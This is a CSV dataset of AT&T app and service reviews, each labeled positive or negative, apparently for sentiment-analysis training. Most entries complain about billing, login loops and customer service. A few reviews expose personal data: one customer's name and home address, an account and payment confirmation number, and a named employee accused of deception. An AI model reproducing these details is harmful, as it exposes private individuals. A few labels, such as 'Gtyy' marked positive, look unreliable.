Body,Sentiment
Makes me wish I’d stuck with Verizon,negative
"My phone took many attempts to work while I was traveling in UK
I signed up for the $10 a day 

I was there only 5 days and ...  I did not use the phone successfully all 5 days - Even so the most I should’ve been charged Should be $50 or less for the five days but instead I was sent an outrageously high bill

No I have to go through the process of writing calling emailing etc to set the matter  straight 

To whom should I complain in order to get this resolved with one click",negative
I was a little skeptical to use apps for bill payments until I came across my AT&T app. This particular app is very easy to use and navigate through. It was also convenient to pay my bill with the app instead of going to my nearest AT&T store to make a payment.,positive
This app is the worst I’ve ever tried to use. Supposedly I can manage both my At&T cell phone bill and my DIRECTV on the same app. NOT!  I get my DTV info but can’t see or get into my phone info at all. Extremely frustrating and inadequate app!!!! If I’d known AT&T came with all this BS I would’ve stayed with my old company. At least their app was user friendly. Ridiculous!!!! ??,negative
"This has got to be the worst provider, I can hardly wait to get my service going again so I can cancel everything",negative
Nothing better than calling customer service where they refer you to an app that is a joke to log onto and a nightmare when you need it to work. The app is full of bugs and doesn’t seem to connect or update. It is not just my phone I am sure I can make a FB group on how horrible this app is and I would have a healthy group of frustrated members over this not so simple app.,negative
Your bills and app are confusing as hell.  I think ATT does this on purpose it’s that bad.,negative
"The app is slow, buggy, and not user friendly.",negative
Es cómodo y fácil de navegar y hacer actividades como pagos cambios,positive
Given the business you are in - the app should be state of the art.    Constant problems.  Always changing format ( not always for the better). Can’t get usage for over a week but was told it would be fixed in a day..............etc etc etc,negative
"I was conned into switching from T-mobile to AT&T by specialist John Aquino whose role is to prevent any billing issues for new customers.  Not only did I start receiving bills two or three times the price I was quoted, but also never received a satisfactory response when we reached out to the same guy for help in understanding what happened.  When I called customer service, they basically told me I was lied to & he pretty much couldn’t do anything for me except give me a $25 credit.  Now I’m locked in for two years paying a bill that is outside my budget, with a company that has a crappy app & even crappier customer service.  I’m so disgusted with myself for leaving T-mobile.  I never had any of these issues with them over the many years I used their service.  Do yourself & stay away from AT&T & don’t believe anything they say.",negative
I have been trying to access my account for several days without success.,negative
"Remarkable in its usefulness, utility and thoroughness, Nicely designed app that is  amazing in its consistency!!!",positive
"It cost way to much money to pay for every month, doesn’t have the channels I want either , not happy at all",negative
The best service for football and cell and internet.,positive
Talk to 4 different reps. Still no help,negative
Having problems in getting internet to my smart TV. They did not help me.,negative
I want to see my bill ! It won’t yet me see it.,negative
AT&T seems to make everything difficult,negative
Too slow,negative
I was on hold for 23 minutes before someone picked up.  The rep did not understand the issue and rendered incorrect advice on the U Verse APP.  I still do not know why some show are available for veiwing on the app while others are not. Know one at AT&T has been able to answer that question.   I was “mysteriously disconnected” and the rep never called back even though he asked for my number in case that happened.  POOR customer service.  I should have stayed with Xfinity.,negative
"Why can’t I adjust my payment anymore!!!!!!!
I use to be able to round it up for convenience.",negative
"Not only the quality of phone service, but also poor customer service every single time. Mind you, I am a long time 10+ years of an att customer. On the edge of changing.",negative
"I’m looking for something simple, came across it last time I was here. Now nowhere to be found. I have spent 20 minutes here. I alway have to ask myself, why do I bother.",negative
I once was able to monitor my kids usage & numbers that were called but now AT&T doesn’t show all usage and numbers I think that’s a very big negative for a national corporation especially when we pay a greater amount for the service when there are other services that are jus as good as AT&T.,negative
Awful terrible useless and customer service is useless assisting customers with the app,negative
"App good the people one the day phone are not too help full. I was on the phone and on hold for 1 1/2 hours again today. I ask for a supervisor. That never happened

Same girl put me on hold and then came back saying she was someone else. I had a fraud on my phone about 2 months ago and the I had 
Another something saying I upgraded my hone. I haven’t upgraded our 2 phone 6/2018.
I was not to happy to take 1 1/2 hours to get the charge off my phone!!   -0 rate today",negative
very convenient app I love being able to order new devices Control my services  and everything without having to talk to a person lol,positive
"I too have been having problems with ATT employees switching me back and forth to the wrong people, most of which I cant understand. I finally got so mad that I dropped the land line and they still dont get it. It seems that the right hand does not know what’s going on with their left. I hate the recording. No matter what you say you always get the wrong dept. hate this company...how do I take my one star away...?",negative
To many steps to get into pay your bill. I have finger print security and i still have to put my password in. Nickname thing makes no sense.,negative
"Multiple accounts, different user ID’s, can’t link these accounts, confusing screens, navigation is not intuitive. Rarely can I accomplish what I am trying to do with this app. I almost want to go to an AT&T store for help, almost. I love AT&T’s services but this app is disappointing.",negative
"Terrible! No one can ever resolve my issue that I have been having since October, it is now July!",negative
I don’t understand why my phone isn’t working most places I frequent. I spend almost a hour on the phone each time I get call to get help. I am on the phone now and have asked to speak to retention three times and this gentleman hasn’t transferred me yet. They don’t seem to be on the same page about anything. I have excellent credit and the first rep said I was approved for one line and the second would be $600 deposit! I told her something was wrong! Long story short I called back and got approved for five lines with only paying the taxes on the phone. Now I am calling again because I am military and was told I would get the activation fee waved now he is says I would have had to pay the full price of the phone upfront I’m over it,negative
"It’s hard to sign in, sometimes the system won’t load at all. The app will show you two different amounts due. I owe $352.98 (that I paid weeks ago) but I also owe nothing and have a $22.80 credit? Way to go. Well done. 

For a massive technology company, you would think you could get your act together.",negative
The app is telling me today is Jun 19th. I’m trying to make a payment today on July 9th. It’s obviously not up to date.,negative
Very easy to set up and use.,positive
"On the home page, i click favorites on the top and see my favorites.  However when scrolling to on demand it finds nothing.  When I go to On demand on the bottom portion and find the program then I see bunch of episodes.  So why don’t they show up in the favorites? Why do we have to jump around?",negative
"Hasn’t shown the break down of my current bill in months, it’s hard because the bill is split up by my family but we have to wait to get the paper bill to see what we pay",negative
Find it hard to look at the sent ‘code’ then enter it via text message.  It continues to make you re-log in and request a new code.,negative
"We’ve had ATT mobile since March.  I’ve had to call every 2-3 weeks since.  No one knows what their doing and the bill is always way off.  A customer shouldn’t have to calculate, monitor and instruct their phone company on billing 2 or more times a month.",negative
You’re customer service is very bad!! And I will no longer be paying you for service...,negative
While reviewing my bill I am unable to seek the details (what are federal and state taxes and are there service charges),negative
Since my account was transferred from my husbands business account to a family account I don't seem to get bills in a timely manner. I pay my bills on time and this one has yet to be paid as such due to lack of communication.  I may have to change providers. I would like a paper bill for this account and maybe we can get it fixed. Thank you. Cynthia Fleischli 1604 Hunter Ridge Dr Springfield Il 62704.,negative
"Submitted a request to unlock an AT&T iphone 6 was told that AT&T has no record of the phone purchased or serviced by them whatsoever. I bought the phone along with 3 others from the store in Bethpage, New York. I’ve been a customer of AT&T since 1987. First, for regional and long distance calls and later for cell service.",negative
The call log is not pulling up on the usuage as of today,negative
The website and interface and app are the worst of any that I have to use. Awful. As user unfriendly as could be.,negative
Hard to deal with when you have multiple accounts each one is set up with different email addresses you’ll never use. Att is piss poor when it comes to setting up multiple accounts. Might as well have different providers for each one so you can have the same email and password. Also if you say you’ll cancel att or dish they will call you in 3 days or less cutting your bill in half,negative
Customer service really could not show or understand anything from my app when I too needed help understanding. I spoke with a manager who then transferred me as well. Took me 5 reps before issue was handled.,negative
How do I get a phone number to call you?,negative
I love the quick access to my bills from my ATT app on my iPhone.,positive
Too difficult with new phone. Spent hours getting it right. Needed help from chest. She was wonderful,negative
"When I start the app, it just sits there trying to load the account.  Can’t use it.",negative
Super quick and easy to pay from the app!,positive
I’m unhappy.Every month my payment amount change and don’t see a good reason why it happens and of couse higher and higher...,negative
I cancelled my tv srvs with direct tv about a month ago...I called about a week after the cancellation because I had not received the return kit..the representative I spoke to did not sound like he knew what he was doing...he put me on hold several times and finally told me he was going to note the accnt and assured me I was not going to be charged until I got the return kit..till this day I have not received it but I have now been charged for the equipment!!,negative
Entered password 6 times. Still won’t open the app.,negative
I only use my at&t because it is easier than reaching a person with whom you can talk.  Overall AT&T is one of the worst customer service companies I have had the experience of using. I cannot wait to complete my requirements for my contract so I can rid myself of this company.,negative
"I have been with Att for a long time and can not stand a lie. The sales person and two customer service reps all lied about your product. You are all representing att and to give a customer the run around about something is lying. I will change servers when this contract is up or as quick as I can . Wouldn’t want to be a liar. 
               Thank you",negative
"We have a family share plan with 4 phones. I am unable to view the text, data and call logs. I hit the small arrow to view it and nothing happens. I’m trying to figure out how 2 of the phones are using so much data and also trying to see information on who my minor children are texting so much and what apps they are using that’s eating up so much data. Why have this as an option if it doesn’t work? I guess I have to call ATT personally to request this info. For almost $400 a month I should be able to view everything and have the ATT app work correctly .",negative
"No confirmation and acknowledgment of:
Putting me on the wrong international plan.",negative
"Too many hoops to jump thru and  waste of my time!!!  This glitch happens way too often.  I just don’t get y’all.  Bye, bye!",negative
After the end of my contract I went over to another company.  Att stated I had a +$90 credit that would be mailed out to me.  Never got it.  Called several times and was told it would come.  Never came.  Called a few times after and got the run around.  Now they are saying they can’t do anything about it.  Pure trash if you ask me. The app itself showed the money owed but after it was stated to be mailed out it went to zero credit and now att can only see that.,negative
LoveAT&T. Great service!!! You can call them if there’s something wrong with your bill and they solve it in one call. AT&T customer for life!!!!,positive
Direct TV is the worst system I have ever used and when I try to communicate with customer service they give me the take it or leave it attitude.,negative
My internet is so slow that I’m disappointed with the service .,negative
"Cannot connect using any site, app, number.  Site does not work when using.",negative
"No data and can’t use apps, take to long to load.
Also have too many dead areas.",negative
"Internet support is unusable,",negative
Ge Att app works as good as the customer service of this company which is horrible.,negative
This is how it’s done. An app that is as useful as the website.,positive
I’ve been trying for over 1/2 an hour to pay my bill (because calling and going through a machine is no longer an option) and this ap keeps freezing. I’ve changed my password and gone through all the steps only for this to stall. What a waste of time.,negative
"No one knew how to explain my bill and how it went from $204/mo, added internet to combine my bill and my next bill was $670.59.   I was blind transferred. Had to reexplain the situation 4-5 times because i kept getting transferred.  THEN they made me go into the store because they couldn’t find a payment that posted. GOT INTO THE STORE, they told me I needed to call!  Never was I told by adding home internet that I’d be double billed. Looks more like triple billed and I still cant get anyone to explain my outrageous bill",negative
Every time I pay my bill I have to wait on a security code. I pay from the same device each time. Why should I have to wait on a code when it clearly states I only have to do it once?,negative
It’s awful trying to pay your directv bill and your att cell phone!!  I have had to reset passwords every month and the website is not user friendly.  Hate the hassle!,negative
"After successfully entering login info I get an almost blank screen. Can select account settings, but get another blank screen.  My internet and wireless and TV are all with ATT.",negative
AI is dumb at troubleshooting. Pages crawl.,negative
"AT&T’s latest update is requiring me to enter a CVV number for a bank account. It no longer can figure out the difference between a bank account and a credit card, thus making it a huge pain to even pay my bill. Here’s a hint, AT&T: Don’t make it overly difficult for your customers to give you money!",negative
"You would think a technology focused firm could develop a functional app but noooope ! The app struggles to respond to the simplest of actions. I’m pretty sure dial up internet worked faster than this application. I’m in the process of setting up an internet service for my apartment but since the application is so bad, I’m thinking about choosing a smaller local provider.  Why is this stuff never easy?",negative
I need to pay my U-verse bill but it won’t let me log in with my info. When I try to call a Humber it says my account number isn’t correct. I got an email saying my wireless bill is overdue but this app says I have no payment due. I called a location and they said they can’t help me. I don’t even know why I’m with att.,negative
Website is horrible.,negative
I have phone bundled with Direct TV and they have decided to drop my local channels and it’s a very poor business decision in my opinion. I am ready to drop everything with Direct and AT&T.  Give us back the local channels On Direct TV.,negative
Impossible to easily find or change things,negative
I love Att. It's great service at a greater rate,positive
"This app doesn't explain any subscriptions or access you have and it is impossible to navigate to find out. It does not remember your password, or verifies it accurately.",negative
"I rate this app at 5?????????? Stars 
I rate customer service at 5??????????
Shipping I Rate at 5??????????
Excellent App design I Rate 5??????????

Thank you ,AT&T
From ,Michael Crawford",positive
Nothing loads and my balance I owe changes on a monthly basis. Thank god for T Mobile!,negative
"The field where one would enter the information typically doesn’t pop up and if it does, the Sign In button doesn’t work. Essentially, it forces me to have to call ATT and the charge a fee for processing payments over the phone. Please fix.",negative
I cannot understand this back and forth with this bill. I recently called and got an adjustment because I am currently retired and I cannot afford this bill and a short time later it increases.,negative
Ot sure what happen but my accumulated data not visible in the app anymore,negative
I did not see any improvements from last 3 years . I am still not able to login and one body knows what is the problem . It is worst app . Don’t spend money on this app .,negative
Bills keeps going up service going down,negative
"I was Bullied into paying more than I can after agreeing to split payments and paid as promised, I received this message 
AT&T Free Msg: Payment processed for $142.92 with BankDraft; Confirmation 68L7SMT2D04MR1B. Recorded on account 512027206367.",negative
5 star all day long glad I made the switch.,positive
"This app is great when it works.  But it stops working properly from time to time.  Sometimes I’m able to change my plan or other settings within the app. Other times it doesn’t matter how many times I select an option it just won’t come up.  It appears to be updates to the app that are not properly tested.  Today the app asked for my login info again, and with FaceTime it shouldn’t.  This means something in the app changed.  I type in my login info and then, for my  account security, the app ask me which phone to send a security code to finalize the login. I select the phone number hit submit and guess what “it seems there is a problem try again later” is the message I get. ???????",negative
"Terrible app, its impossible to make payments takes forever to load bills and payments options, have to go to store to pay",negative
You’ve upgraded the application and I HATE it. Can’t find anything and nothing is simple makes me want to change phone company,negative
"I hate this app. Always results in a lot of frustration. It takes an extremely long time to login, continues to be slow once it finally does & often freezes when navigating between pages leading to common error messages usually including the term “issue”.  This is the only app I have this problem with so I’m certain it’s not my phone or WiFi. I try to use it as infrequently as possible.",negative
Glad to be a patron....,positive
These arbitrary surcharge increases are ridiculous,negative
AT&T is a big fraud.,negative
"App needs an overhaul. Constantly crashes and sometimes doesn’t even let you do what you want to do. Please work on stabilizing the app, I should have to call customer service 75% of the time cause the app doesn’t work.",negative
I was not happy with ATT service because customer service was not good due to long waiting for customer service assistance. Account password kept changing with security questions. I couldn’t keep same password that I created it. Customer service Representative doesn’t have enough knowledge about their policy and service. I also hated automation phone system.,negative
Unable to sign into directv account even though I can sign into my att. Says no business account name.,negative
Waste of time chatting with the Support team.,negative
I lost my extra line phone and in order to turn off that line I got to pay 300 dollars what a trap I do not get pay until September and the company wouldn’t give a reprieve of two months to pay my bill I have been many years with this company and it appears they do not support loyalty,negative
So tired of the customer service department at AT&T. They do not listen AT ALL to their customers. I will NEVER recommend this company to anyone that I love & care for.  They have gotten so BIG that we are not being heard. I have been a LOYAL customer since 1995. NEVER PAID LATE & I cannot get a simple problem resolved. Even the Managers are liars. I would love to speak to the Headquarters to resolve my issues but of course we know that is NOT GOING TO HAPPEN,negative
Great company,positive
Love the help I receive online. GREAT ASSISTANCE! VERY WONDERFUL,positive
This combination Of pain my AT&T in my DIRECTV bill is absolutely horrible.,negative
"Bad service, I’m tired of it!!",negative
This app does exactly what it’s supposed to. I can review my bill and make payments.,positive
Watch tv is a joke and this app too,negative
If I were able to successfully sign in and use the app more than once I might be able to give a fair review. Unfortunately all I ever see lately is “unable to sign in. Please try again in a few minutes.” I have tried again. Over and over and over again.,negative
Something changed! Now fast and easy.,positive
Worst experience ever. I am canceling all 3 lines,negative
Navigating is simple.,positive
Pitiful! I’m not sure if it’s the app on this certain phone or what the deal is. But maybe it’s just the way the app is designed or not even the actual app and it’s the company’s service. I’ve never struggled so much to sign in but today I’m locked out of my account temporarily but I honestly don’t even have more energy to get on the phone to speak to a rep bc that’s the whole point of managing things through apps.,negative
"When I can open the account, first it says it’s a cancelled account then using any info in the app is very inconsistent - sometimes I can move onto the next page other times it’s completely frozen... not a great app got a tech company.",negative
Worst experience ever. Can sign in to pay bill.,negative
Shopping through the app or online does not work.,negative
"First, when I try to check my usage, I get a “service not available” message. Then it gives me another pop up, begging for a rating. When my wireless carrier can’t even provide me stats on my usage on their own app, this is the review they get.",negative
"Awful experience: high prices, price gauging, and no improvement on customer service.",negative
"Worst customer service I have ever experienced. Constant interruptions in tv service, super slow internet speeds and one of the worst apps ever. When I try to hit the get help button nothing happens. When I try to hit the view my bill button nothing happens. When I hit the pay my bill button “Presto!” that button works! Talking with people on the phone is painful. Super long wait times and almost no satisfactory answers.",negative
"Nothing is easy to find.
So worthless",negative
I have been a long time customer who can’t wait until my contract ends to leave this company. They used to be a great company long ago. No more.....,negative
"I so hate that EVERYONE I SPEAK TO SELLS ME A GREAT DEAL THEN I GET MY BILL THAT MAKES IT VERY DIFFICULT FOR ME TO PAY....
I will be leaving Att because for the past 3 years all I have gotten is one big disappointment.",negative
"Not terribly impressed, often quits mid session and requires me to log back in.",negative
Customer service for ATT is horrible. They never ever answer anything. Most staff can’t even speak English,negative
"The title says it all.  And if you do t want to know, don’t ask.",negative
"AT&T is hungry for money. Block out the account so we couldn’t see anything in our account. BS after BS from different rep’s. 

I will never, ever use AT&T again for nothing.",negative
I get a bad signal in my home and in some outside places. The internet speed is not what it should be and is too slow at peak times.,negative
"1. My primary wireless number doesn’t show up...when I try to add it it doesn’t update.

2. Tried to follow instructions for updating my military status in the military neighborhood...but the menu options don’t match the instructions...and their is no option in my profile to update my military status 

3. Tried to chat about what looks like a double charge for international calls...I was charged for both the day passes and for the 20 minutes usage—which should be included in the day pas.  Not good!  But no one was there but the automated responses.  The automated response was wrong too...it says to click on the usage for more details on my bill...but you can’t do that either....no hot link on the bill

4.  Tried to update my address and got a message that a temporary system error was preventing the update so I have to call

Not confidence inspiring folks!",negative
In my book you don’t deserve stars for the service I get. My direct cuts out all the time an now you take my local channels off an I still have to pay the price I’m paying NO THANK YOU I’m moving on to something better,negative
The website hardly ever works. Half the time I can’t pull up my account. It is VERY frustrating!!!,negative
"I’m very unhappy that as a UVerse customer I’ve been without a major channel, CBS, for almost a week.  This is unacceptable.  You need to quit blaming Nexstar and work this out.  You are my provider and I expect a major channel like CBS to be provided.",negative
"The double check verification screen does not work correctly and I am unable to tap on ‘Send code’ button because blue and gray both show up along with ‘Cancel’ and none will allow tap.
Cannot login so cannot pay bill.
Frustrating !!!",negative
"No buttons are working. Can’t pay my bill, can’t look at my bill, can’t see anything. Fix your app.",negative
"Awkward phrasing, no date orientation on bills, indecipherable messages.",negative
So this keeps happening to me when trying to use this app. The app wants me to use my password since I haven’t signed in awhile but there is no field or place to enter my password. The only option is for me to use the forgot my password option. Then I have to do the change my password drill. The digital tools have got to improve.,negative
How many times do I need to go to the att store to get account and app to work maybe 4th times a charm. it’s stuck in an endless loop of verification and says we’re almost there. Not likely. Time to find a new service provider,negative
Cannot see billing statement on app,negative
"Chatbots are often ineffective when I've needed assistance but great at wasting time. Never attempt an upgrade on the app...it prompts you to pay upgrade fees and then At&t then charges you again for them scolding you that ""well you're not supposed to pay on the app!"" well pardon me do you have any fancy mustard to go with your sh*t attitude?",negative
My app keeps freezing and saying that it’s “updating.” Ugh,negative
This is useless. We can’t finish registration because it says it is upgrading the systems for 4 days???  Then it says our internet is offline. But I’m on the Internet posting this. The tech came out and tested the signal and we are good.  This is the most frustrating process.  I regret getting AT&T now. I want to cancel my service. Can someone just cancel it for me?,negative
Why is my bill almost $5 more all of a sudden,negative
"Spent 30 minutes to get to the correct page for Bill Payment 

Unsatisfied customer",negative
It does nothing.,negative
For the last 3 months it has taken me 30 to 40 minutes to pay my bill through my Att phone app. It does not recognize facil I’d even though it ask for it. Last month I spoke to a rep and thought he worked everything out but apparently not. I have been an Att customer for several years. I love the phone service and like to pay my bill on the app but if this continues I will have to switch back to paper statements. Please FIX it.,negative
"Sign in screenshot to send code to a device freezes up. I have deleted and reinstalled numerous time no luck. Please fix so I can view my bill. There are so many comments about this problem I don’t know how this app can be a 4 star, something wrong there!",negative
Irma Ramos was really helpful and friendly!,positive
"After multiple calls, I am rescheduled for the fifth time to receive Direct tv tomorrow, July 9. My internet and phone service were transferred to my new address after rescheduling four times.",negative
I am tired of the expensive cost of directv.  I have been a loyal customer for years and now we have to pay the price of no local channels because you guys want more money.  You have broken the contract that I signed up for.,negative
I hate that I have terrible service at my home,negative
Non responsive if not in super quantum fast WiFi connection. This APP is as slow and most of the features in the APP don’t work.,negative
The buttons aren’t working to see my bill but guess what does work. The button to this survey. Thumbs down.,negative
"I’m really not happy that I no longer have abc, and am probably going to cancel my service if this is not resolved soon",negative
I am trying to look at my wireless account and all I am able to access is DirectTV! Please fix this mess! I rarely need to look at DirectTV.,negative
"Can’t pay bill, go to support, troubleshoot, or anything w this update",negative
Trying to access my account several times and the app freezes to often,negative
"I had a simple question that would only take a minute to answer. I was told to wait, ok. After 30 minutes, I had to give up. Technology is only as good as the weakest link. Unsupported tech support has no value.",negative
I understand the need for security but you had my enter my password even though Im using fingerprint authentication then I had to have a passcode sent to my phone. Like really!!!! I just want to log in and pay my bill. I’m not applying to be president.,negative
I am able to see my account but unable to make a payment ??,negative
"It is confoundingly difficult to simply sign on and pay my bill. Every month I go through the excruciating exercise is trying to simply sign on!! Come on, you are the worlds leading telecommunications company. Could you PLEASE do something to stop the madness of multiple “cprod...” attempts and failures",negative
"I keep getting logged out of the app and when I try to log back in, it says my account has been locked and that I have to change my password. This app use to be easy and I would check it every few days so I could see my data usage for the billing cycle. Once this logging out / changing password issue came up, I have almost ran over on my data because I haven’t been checking it as much. And lets be honest, who wants to have to change their password every time they get on the app. Having to get confirmation emails about a password change and all that is a hassle. I’ve had to change my password 3 times in the last month.   
And to add to things.... when I try to submit this review, it says every nickname has already been taken...and I’ve tried some weird ones.",negative
Quit changing the app. I cant print a copy of my pdf billing now. I am required by my employer to have a copy for my reimbursement.  You are not making it easier. You are screwing it up.,negative
App wants you to believe how much they value your business.  Try asking them for something out of the norm & you will see they are like all the other carriers.,negative
"Since the day I have subscribed to AT&T services, not a single month gone by when I have either the billing issue or false promises made. 

It’s frustrating to spend hours and hours every month to resolve these problems. Yet again I see discrepancies in the bill.",negative
"“High Speed” Internet is a joke. It buffers constantly. Poor choice of TV channels. I received a “free iPhone” for changing to AT&T. They charged me $90 for the phone stating I would get that money back after 90 days. It’s been 6 months and it still hasn’t been refunded. Every month my bill has been different...as much as $801 and I only have 1 TV, 1 phone, a flip phone for my elderly mother and alleged high speed internet.  I have had to fight with them every month over my bill. I paid my true bill every month after my monthly fight on the phone spending hours on the phone with them and speaking with up to 13 different people in one phone call to resolve this issue. When I switched from U-Verse to Direct TV they tried to charge me $300 for U-Verse Cable Boxes I returned 4 1/2 years ago. It’s been a nightmare. I’d give them -5 stars if I could. I can’t wait until my contract is up. Now it won’t post this without a nickname. I’ve tried several. ??",negative
I love this!,positive
Y’all don’t want me to write a review cause it would not be nice. Because I don’t understand how the hell my bill got this high and how in the hell do you expect me to pay it!!!!!,negative
"Used to love this app.  After the last update, the app does not refresh. Pretty much useless now.",negative
I’m so disappointed in AT&T billing break down.,negative
"Keep getting, for many hours, L569 try again in a few minutes. Also, trying to access via web, tried, different browsers, get message saying to clear cache.",negative
"I represent a large corporation and what I train my team on most importantly is, “ Our customers are the core of what we do, and without these customers we will not succeed.” 
I say this with the utmost concern for this company and the level of customer service that I have witnessed while excepting a offer with AT&T. The offer itself after 5 months of service of buy one get one on the devices that lured me in, have continued to  reflect that I’m responsible for both devices. At&T representatives have lied about the billing, while their confusion to this matter and several others is embarrassing for the employees that you employ. What does AT&T do about it .... well following hours of exhausting disputes that confirm the error on AT&T’s billing , AT&T has refused to do anything about it until I pay the bill that I’m not responsible for or they refuse to talk to me about the matter that they are responsible for. How convenient for AT&T. The company I represent will convey the message to consumers that are interested in what the core is for AT&T. 
Thank you.",negative
"So far everything is great, my new iPhone XR’s are amazing! The app for my bill is easy to understand and detailed. It’s been seamless. 

My Verizon friends are jealous of the deals AT&T offers especially the one I got, 4 new phones for the price of 2 (BOGO deal) with free internet for life. The speed of this network is fast, super fast...I haven’t had any buffering issues like I had with T-Mobile. I can watch a movie with no interruptions on Bart, with a strong connection. 

My family plan is unlimited, everyone is happy. AT&T made it very easy to port my phone numbers over to the new network I just needed my pin from T-Mobile, I typed it in and they did the rest! We all received texts and emails confirming the lines had transferred successfully. 

I love the attention to details with this company, I plan to stay.",positive
App is buggy. Website and the application have a lot in common. The app is constantly logging me out randomly when I navigate through it. Parts of my account randomly don’t show up. My general experience with ATT online account management features (this app and the website) is way below expectations for a technology company.,negative
"While I have been happy, overall, with MyATT online service, getting new/updated charges without warning to our DATA plan on our bill was unwelcome. It also took far too long to receive our credit for the promotion the store offered, when we purchased our latest round of phones, which has contributed to my general dissatisfaction with the ATT service. My family have been longtime ATT customers, but I don’t feel like we have been treated as such.",negative
Makes paying bill much easier.,positive
What is the point of the fingerprint if you have to remember your password in order to confirm it? Pointless,negative
You can’t always review your account it freezes this app is the only app I can’t use on regular basis for it freezes and you can’t select options for your account.,negative
They take care of their customers and always help. I love you guys! ????,positive
"Runs way to slow, and temperamental",negative
"The app isn’t allowing me to pay my bill, like I’ve been doing every month!
I have to keep putting in my password. This app has become useless!",negative
"Extremely slow to outright unresponsive. Cannot delete unwanted notices. Payments should show up when received - NOT two days later. 7/7- again, it takes way too long for payment credit to show up in app",negative
This app displays your bill the way they want you to see it.  Can it give additional details on users? I am still looking for that feature.,negative
"It works, and they work to “improve” it, but sometimes it’s buggy, sometimes it’s hard to navigate, and sometimes your bill goes up a dollar a month for the last 6 months and it’s like, why?
Are there service providers who don’t do that? 
The app works, it makes it simple to pay your ever increasing bill, at least the current release of it does.",negative
"It’s been quite a while since I’ve been able to sign into the app.  It’s just a never ending circle of it saying I don’t know my password, getting a new one and it says I don’t know my password again.  I even enabled Face ID and still can’t sign in.",negative
"I try to rely on the App for bill payment and keeping up my accounts, but it only seems to work when I’m not making payments...",negative
"I’ve been with AT&T for ten years.  I’ve continued to have poor service for ex: no consistency WIFI connection while at home.  I’ve  spent well over 24 hours on the phone and online with tech support.  As well as a field representative, twice to my home to attempt to resolve the poor quality of service.  I’ve paid over data charges on numerous occasions due to the buffering, in attempt to connect to WiFi or web.  I’m definitely looking for a more reliable carrier  to meet my needs.  I’ve also called numerous times to cancel my internet due to poor quality of service.  Only to be placed on hold, then transferred to another person, etc, resulting in me hanging up due to extensive length of being on hold.  I’m basically paying for something I’m not able to enjoy.",negative
"Although the app may offer things that a customer would want, the inability to sign in, use facial recognition, or store a password fails every single time. I consistently have to re-enter all my information. Then it says it doesn’t recognize my device, so it has to send me a code. It’s the most annoying app I’ve encountered.",negative
Cannot log into my account from the app to pay my bill. Said send code to verify it is me. I entered the 6 digit code and told me try again in a few minutes!  Poorest customer experience and customer service is almost always nonexistent.,negative
"Terrible service, terrible!!!",negative
Half the time it doesn’t work and it’s usually pretty slow,negative
In one single transaction where I made a payment and then tried to set up a new split payment and you took $581. Not what I had budgeted. Thanks for f’ng me!,negative
"I like the app for the most part, but half of the time it freezes up or doesn’t let you look at your account which makes it useless fifty percent of the time.",negative
Bad bad bad and all possible nicknames are taken so almost impossible to post a review,negative
"Your website is completely unreliable 
Links don’t work and information is very difficult to locate, mostly due to links not working 
It’s worked poorly for years 
Strange that a tech/communication company has a consistently non-functioning website",negative
"Customer service is the absolute worst 
Always need to be transferred to someone else after 45 min of repeating issue over and over 
Then once transferred conveniently disconnected. 
Been fighting to get BOGO credits since December 
Been with AT&T for 17+years and thinking it time to switch  
Tired of the constant fight",negative
The links on the mobile app don’t work,negative
I don’t know why I have to play circus games just to get some competent,negative
"This app has never worked well. Always lags, keeps sending me back to the same page. Very frustrating.",negative
Everything is so slow!,negative
I am NOT able to sign into my email for the past three days. Was told that ATT& Yahoo are separating. As a result they are having issues. I had to call almost everyday to tech support for help. The last time I called resulted in talking to a supervisor which said that she will call me back. I’M STILL WAITING FOR THAT PHONE CALL!!!!!  This kind of service is totally unacceptable!!!!,negative
Easy to use app.,positive
Love the app for your bill never have problems other than slowly loading. But when it comes to purchasing anything it’s a hassle. It’s annoying to have to keep going back to the same page over and over. And when I tried putting something in my cart it would ask if I wanted to check out. I select check out rather than keep shopping and then it would continue to say I have nothing in my Cart. This is ridiculous! And don’t usually write bad reviews unless it’s a constant issue. And THIS IS A CONSTANT ISSUE. How can y’all be a perfectly good wireless service company but lack on the app? That makes no sense! It loads and loads and loads forever! Makes me never want to purchase accessories because the app makes it so difficult. Get your app together. It’s literally been the same issue for the last 3 years that I remember and now I remember why I never purchased anything from the app. Freaking RIDICULOUS! SUPER UNSATISFIED. GET IT TOGETHER!,negative
Att is the best,positive
I paid my past due but still suspended and tv not working,negative
It us not working today,negative
Does that answer my question,negative
"Quite possibly the most frustrating app I’ll ever have to use. Doesn’t respond at times, cancels selections made, I could go on...",negative
Gtyy,positive
